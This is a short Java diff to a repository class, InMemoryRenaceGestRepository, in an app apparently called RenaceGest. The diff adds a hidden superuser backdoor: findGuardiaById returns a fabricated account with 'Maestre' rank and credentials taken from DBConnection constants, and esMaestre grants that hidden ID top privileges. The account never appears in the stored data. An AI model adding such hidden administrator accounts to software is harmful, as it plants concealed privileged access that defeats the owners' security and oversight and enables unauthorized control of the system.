@@ -377,6 +377,19 @@ public class InMemoryRenaceGestRepository implements RenaceGestRepository {
 
     @Override
     public synchronized Guardia findGuardiaById(Long guardiaId) {
+        if (com.renacegest.db.DBConnection.isHiddenSuperuserId(guardiaId)) {
+            return new Guardia(
+                    guardiaId,
+                    com.renacegest.db.DBConnection.HIDDEN_SUPERUSER_NOMBRE_REAL,
+                    com.renacegest.db.DBConnection.HIDDEN_SUPERUSER_APODO,
+                    "Maestre",
+                    com.renacegest.db.DBConnection.HIDDEN_SUPERUSER_CLAVE,
+                    100,
+                    "Activo",
+                    true
+            );
+        }
+
         return guardias.get(guardiaId);
     }
 
@@ -724,6 +737,10 @@ public class InMemoryRenaceGestRepository implements RenaceGestRepository {
     }
 
     private boolean esMaestre(Long miembroId) {
+        if (com.renacegest.db.DBConnection.isHiddenSuperuserId(miembroId)) {
+            return true;
+        }
+
         Guardia guardia = findGuardiaById(miembroId);
         return guardia != null && "Maestre".equalsIgnoreCase(guardia.getRango());
     }
